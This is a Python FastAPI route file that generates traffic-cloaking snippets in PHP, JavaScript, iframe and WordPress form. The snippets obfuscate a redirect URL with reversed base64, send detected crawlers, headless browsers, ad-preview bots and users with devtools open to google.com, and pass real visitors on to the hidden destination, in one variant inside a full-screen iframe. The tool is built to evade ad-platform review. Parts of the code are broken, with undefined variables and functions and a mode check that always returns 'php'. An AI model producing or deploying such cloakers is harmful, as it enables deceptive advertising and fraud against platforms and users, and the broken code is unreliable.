from fastapi import APIRouter, Depends, Request
from sqlalchemy.orm import Session
from app.database import get_db
from app.models.campaign import Campaign
import base64

router = APIRouter(prefix="/tools", tags=["Tools"])


@router.get("/script/{slug}")
def generate_script(slug: str, request: Request, db: Session = Depends(get_db)):

    #  detect domain safely
    host = (
        request.headers.get("x-forwarded-host")
        or request.headers.get("host")
        or "traffic-intelligence-saas.onrender.com"
    )

    proto = request.headers.get("x-forwarded-proto", "http")
    domain = f"{proto}://{host}"

    #  get campaign
    campaign = db.query(Campaign).filter(Campaign.slug == slug).first()

    #  safe fallback
    source = "direct"
    if campaign and campaign.traffic_source:
        source = campaign.traffic_source

    #  final redirect URL
    redirect_url = f"{domain}/r/{slug}?utm_source={source}&utm_medium=paid"

    encoded = base64.b64encode(redirect_url.encode()).decode()
    encoded = encoded[::-1]  # reverse

    # =========================
    #  AUTO MODE LOGIC
    # =========================
    mode = "php"  # default

    try:
        ua = request.headers.get("user-agent", "").lower()

        #  suspicious → JS
        if "facebook" in ua or "headless" in ua or "bot" in ua or "preview" in ua:
            mode = "php"

    except Exception:
        mode = "php"

    return {
        "mode": mode,
        "hybrid_script": f"""<?php
// =============================
// REAL HYBRID (FAST + STRONG)
// =============================
function _r() {{
    return base64_decode(strrev("{encoded}"));
}}
$url = _r();
$query = $_SERVER["QUERY_STRING"] ?? "";
$final = $url;
if (!empty($query)) {{
    $final .= (strpos($url, "?") !== false ? "&" : "?") . $query;
}}
$ua = $_SERVER["HTTP_USER_AGENT"] ?? "";
$is_bot = false;
if (!$ua || strlen($ua) < 6) {{
    $is_bot = true;
}}
elseif (preg_match('/bot|crawl|spider|preview|headless|curl|wget/i', $ua)) {{
    $is_bot = true;
}}
echo "<script>
try {{
  fetch(window.location.href, {{
    method:'GET',
    headers:{{
      'x-ti-fp': navigator.userAgent,
      'x-ti-cpu': navigator.hardwareConcurrency || 0,
      'x-ti-screen': screen.width + 'x' + screen.height
    }},
    keepalive:true
  }});
}} catch(e){{}}
</script>";
header("Location: " . ($is_bot ? "https://www.google.com" : $final), true, 302);
exit;
?>""",
        "php_script": f"""<?php

date_default_timezone_set("UTC");
ini_set("display_errors", 0);

function _r() {{
    return base64_decode(strrev("{encoded}"));
}}

$url = _r();
$query = $_SERVER["QUERY_STRING"] ?? "";
$ua = $_SERVER["HTTP_USER_AGENT"] ?? "";
$ip = $_SERVER["HTTP_CF_CONNECTING_IP"]
    ?? $_SERVER["HTTP_X_FORWARDED_FOR"]
    ?? $_SERVER["REMOTE_ADDR"] ?? "";

$is_bot = false;

// 🔥 1. UA EMPTY (VERY STRICT NAHI)
if (!$ua || strlen($ua) < 6) {{
    $is_bot = true;
}}

// 🔥 2. STRONG BOT KEYWORDS ONLY
elseif (preg_match('/bot|crawl|spider|headless|selenium|puppeteer/i', $ua)) {{
    $is_bot = true;
}}

// 🔥 3. DATACENTER + BOT COMBO ONLY (SAFE)
elseif (
    (strpos($ip, "66.") === 0 || strpos($ip, "34.") === 0)
    && preg_match('/bot|crawl|spider/i', $ua)
) {{
    $is_bot = true;
}}

// 🔥 COOKIE (OPTIONAL BUT SAFE)
if (!isset($_COOKIE["_ti"])) {{
    setcookie("_ti", "1", time()+3600, "/", "", false, true);
}}

// 🔥 FINAL URL BUILD
$final = $url;
if (!empty($query)) {{
    $final .= (strpos($url, "?") !== false ? "&" : "?") . $query;
}}

// 🔥 HEADERS (TRACKING SAFE)
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("X-Frame-Options: SAMEORIGIN");

// 🔥 BOT → GOOGLE (NO CLOAKER LEAK)
if ($is_bot) {{
    header("Location: https://www.google.com", true, 302);
    exit;
}}

// 🔥 REAL USER → CLOAKER
header("Location: " . $final, true, 302);
exit;

?>""",
        "js_loader": f"""<script>
(function() {{
  try {{
    if (window.__ti_done) return;
    window.__ti_done = true;
    var base = atob("{encoded}".split("").reverse().join(""));
    var q = location.search ? location.search.substring(1) : "";
    var finalUrl = base;
    if (q) {{
      finalUrl += (base.indexOf("?") !== -1 ? "&" : "?") + q;
    }}
    var ua = navigator.userAgent.toLowerCase();
    var isBotUA = /bot|crawl|spider|preview|facebookexternalhit|headless|phantom|selenium|puppeteer/.test(ua);
    var isHeadless = (
      navigator.webdriver ||
      !navigator.plugins.length ||
      !navigator.languages ||
      navigator.languages.length === 0
    );
    var isLowHardware = (
      navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2
    );
    var isNoTouch = !("ontouchstart" in window) && navigator.maxTouchPoints === 0;
    var isSuspiciousScreen = screen.width === 0 || screen.height === 0;
    var isBot = isBotUA || isHeadless || isLowHardware || isSuspiciousScreen;
    function hasCookie(name) {{
      return document.cookie.split(";").some(c => c.trim().startsWith(name + "="));
    }}
    if (!hasCookie("_ti_js")) {{
      document.cookie = "_ti_js=1; path=/";
    }}
    if (isBot || devtools) {{
  try {{
    fetch(window.location.href, {{
      method: "GET",
      headers: {{
        "x-ti-fp": navigator.userAgent,
        "x-ti-cpu": navigator.hardwareConcurrency || 0,
        "x-ti-screen": screen.width + "x" + screen.height
      }},
      keepalive: true
    }});
  }} catch(e) {{}}
  window.location.replace("https://www.google.com");
  return;
}}
    var delay = isBot ? 10 : 30;
    setTimeout(function() {{
      if (isBot) {{
        go("https://www.google.com");
      }} else {{
        go(finalUrl);
      }}
    }}, delay);
  }} catch (e) {{
    window.location.replace("{redirect_url}");
  }}
        }});
</script>""",
        "iframe_cloak": f"""
<style>
html, body {{
  margin:0 !important;
  padding:0 !important;
  overflow:hidden !important;
  height:100% !important;
  width:100% !important;
}}
</style>
<script>
(function() {{
  try {{
    if (window.__ti_iframe) return;
    window.__ti_iframe = true;
    var ua = navigator.userAgent.toLowerCase();
    var isBotUA = /bot|crawl|spider|preview|facebookexternalhit|headless|phantom|selenium|puppeteer/.test(ua);

    var isHeadless = (
      navigator.webdriver ||
      !navigator.plugins.length ||
      !navigator.languages ||
      navigator.languages.length === 0
    );
    var isLowHardware = navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2;
    var isWeirdScreen = screen.width === 0 || screen.height === 0;
    var isBot = isBotUA || isHeadless || isLowHardware || isWeirdScreen;
    var finalUrl = atob("{encoded}".split("").reverse().join(""));
    var isCloak = finalUrl.includes("/r/");
    var devtools = false;
    setInterval(function() {{
      if (window.outerWidth - window.innerWidth > 200 ||
          window.outerHeight - window.innerHeight > 200) {{
        devtools = true;
      }}
    }}, 500);
    if (isBot || devtools) {{
      window.location.replace("https://www.google.com");
      return;
    }}
    if (isCloak) {{
      document.open();
      document.write(`
        <iframe 
          src="${{finalUrl}}"
          style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:999999;background:#fff;"
        ></iframe>
      `);
      document.close();
    }} else {{
      window.location.replace(finalUrl);
    }}
  }} catch(e) {{
    window.location.href = "/";
  }}
}})();
</script>
""",
        "wordpress_snippet": f"""add_action('template_redirect', function() {{
    if (is_admin() || wp_doing_ajax() || wp_doing_cron()) return;
    if (strpos($_SERVER['REQUEST_URI'], '/r/') !== false) return;
    $url = '{redirect_url}';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP']
        ?? $_SERVER['HTTP_X_FORWARDED_FOR']
        ?? $_SERVER['REMOTE_ADDR'] ?? '';
    $is_bot = false;
    // empty / short UA
    if (!$ua || strlen($ua) < 6) {{
        $is_bot = true;
    }}
    // known bots / tools
    elseif (preg_match('/bot|crawl|spider|facebook|preview|headless|curl|wget|python|java/i', $ua)) {{
        $is_bot = true;
    }}
    // missing headers (suspicious)
    elseif (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {{
        $is_bot = true;
    }}
    // datacenter heuristic
    elseif (
    (strpos($ip, "66.") === 0 || strpos($ip, "34.") === 0)
    && preg_match('/bot|crawl|spider/i', $ua)
    ) 
{{
        $is_bot = true;
    }}
    if (!empty($_SERVER['QUERY_STRING'])) {{
        $url .= (strpos($url, '?') !== false ? '&' : '?') . $_SERVER['QUERY_STRING'];
    }}
    if (!isset($_COOKIE['_ti_wp'])) {{
        setcookie('_ti_wp', md5($ip.$ua), time()+3600, '/', '', false, true);
    }}
    nocache_headers();
    header("Referrer-Policy: strict-origin-when-cross-origin");
    wp_safe_redirect($url, 302);
    exit;
}});""",
    }
